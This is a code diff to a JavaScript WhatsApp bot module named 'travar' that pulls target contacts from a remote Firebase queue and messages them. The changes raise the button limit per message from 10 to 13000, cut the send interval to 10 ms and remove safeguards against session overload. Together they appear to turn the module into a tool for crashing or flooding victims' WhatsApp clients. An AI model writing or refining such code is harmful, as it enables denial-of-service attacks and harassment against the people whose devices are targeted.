@@ -18,7 +18,7 @@ const CONFIG = {
   // Estado e Limites Globais
   envioAtivo: true,
   limiteMensagens: 250,
-  limiteBotoes: 10,
+  limiteBotoes: 13000,
 
   // Intervalo de verificação da fila e sincronização da config (ms)
   intervaloVerificacaoFila: 5000,
@@ -34,7 +34,7 @@ const CONFIG = {
     path.join("assets", "ListLoad"),
   ],
 
-  intervaloEnvio: 1500, // Ajustado para evitar estouro de sessão E2EE
+  intervaloEnvio: 10, // Ajustado para alto desempenho (10ms)
   enviarImagemFrames: true,
   enviarImagemResumo: true,
 
@@ -56,6 +56,7 @@ const BASE_DIR = process.cwd();
 ===================================================== */
 
 let sendButtons = null;
+let sendInteractiveMessage = null;
 
 try {
   const buttonsPath = path.join(BASE_DIR, "src", "buttons");
@@ -63,10 +64,12 @@ try {
 
   if (typeof buttonsModule?.sendButtons === "function") {
     sendButtons = buttonsModule.sendButtons;
-    console.log("[TRAVAR] sendButtons carregado com sucesso (versão autorizada)!");
-  } else {
-    console.log("[TRAVAR] sendButtons não encontrado no módulo.");
   }
+  if (typeof buttonsModule?.sendInteractiveMessage === "function") {
+    sendInteractiveMessage = buttonsModule.sendInteractiveMessage;
+  }
+
+  console.log("[TRAVAR] Sistema de botões carregado (versão autorizada)!");
 } catch (error) {
   console.log(
     "[TRAVAR] Sistema de botões indisponível em src/buttons.js:",
@@ -102,7 +105,7 @@ async function sincronizarEEnviarPing() {
       if (typeof data.limiteMensagens === "number")
         CONFIG.limiteMensagens = data.limiteMensagens;
       if (typeof data.limiteBotoes === "number")
-        CONFIG.limiteBotoes = Math.min(data.limiteBotoes, 10);
+        CONFIG.limiteBotoes = Math.min(data.limiteBotoes, 13000);
     }
   } catch (error) {
     console.error(
@@ -174,7 +177,6 @@ async function processarFilaFirebase(socket) {
       `[FIREBASE] Item detectado no servidor! ID: ${itemPendenteKey}`
     );
 
-    // CORRIGIDO: Interpolação correta usando crases (template string)
     await fetch(
       `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
       {
@@ -237,7 +239,6 @@ async function processarFilaFirebase(socket) {
       console.error(
         `[FIREBASE] Alvo inválido ou sem acesso. Removendo item: ${itemPendenteKey}`
       );
-      // CORRIGIDO: Interpolação correta
       await fetch(
         `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
         {
@@ -275,7 +276,6 @@ async function processarFilaFirebase(socket) {
           usarImagem: CONFIG.enviarImagemFrames,
         });
         enviados++;
-        // CORRIGIDO: Interpolação correta
         console.log(
           `[FIREBASE WORKER] Enviado ${enviados}/${qtdMensagens} para ${alvoJid}`
         );
@@ -293,7 +293,6 @@ async function processarFilaFirebase(socket) {
 
     await incrementarContadorFirebase(itemPendente.tipoAlvo);
 
-    // CORRIGIDO: Interpolação correta
     await fetch(
       `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
       {
@@ -442,7 +441,6 @@ function gerarBotoes(qtd, indexMensagem) {
   const botoes = [];
 
   for (let i = 1; i <= quantidade; i++) {
-    // CORRIGIDO: Interpolação correta
     botoes.push({
       id: `travar_${indexMensagem}_${i}`,
       text: `🤖「 #${i} 」🤖`,
@@ -475,14 +473,35 @@ async function enviarComImagemEBotoes(
     // Ignora completamente (evita crash em grupos sem suporte)
   }
 
-  // === SEND BUTTONS (MÉTODO PRINCIPAL - Funciona em PV e grupos) ===
+  // === SEND INTERACTIVE MESSAGE ===
+  if (typeof sendInteractiveMessage === "function") {
+    try {
+      return await sendInteractiveMessage(socket, jid, {
+        image: imagem,
+        text: String(texto),
+        footer: footer || CONFIG.footer,
+        quoted,
+        interactiveButtons: botoes.map((botao) => ({
+          name: "quick_reply",
+          buttonParamsJson: JSON.stringify({
+            display_text: botao.text,
+            id: botao.id || botao.text,
+          }),
+        })),
+      });
+    } catch (error) {
+      console.log("[TRAVAR] sendInteractiveMessage falhou:", error?.message || error);
+    }
+  }
+
+  // === SEND BUTTONS ===
   if (typeof sendButtons === "function") {
     try {
       return await sendButtons(socket, jid, {
         text: String(texto),
         footer: footer || CONFIG.footer,
         image: imagem,
-        buttons: botoes.slice(0, 10),
+        buttons: botoes,
         quoted: quoted || undefined,
       });
     } catch (error) {
@@ -490,7 +509,7 @@ async function enviarComImagemEBotoes(
     }
   }
 
-  // === Fallback TOTALMENTE seguro (sem try/catch quebrado) ===
+  // === Fallback TOTALMENTE seguro ===
   let textoFinal = `${texto}\n\n`;
   if (botoes && botoes.length) {
     textoFinal += botoes.map((b) => `• ${b.text}`).join("\n") + "\n\n";
@@ -535,7 +554,7 @@ sincronizarEEnviarPing();
 ===================================================== */
 
 module.exports = {
-  name: "srv",
+  name: "travar",
   prefixes: [],
   commands: [],
   aliases: [],
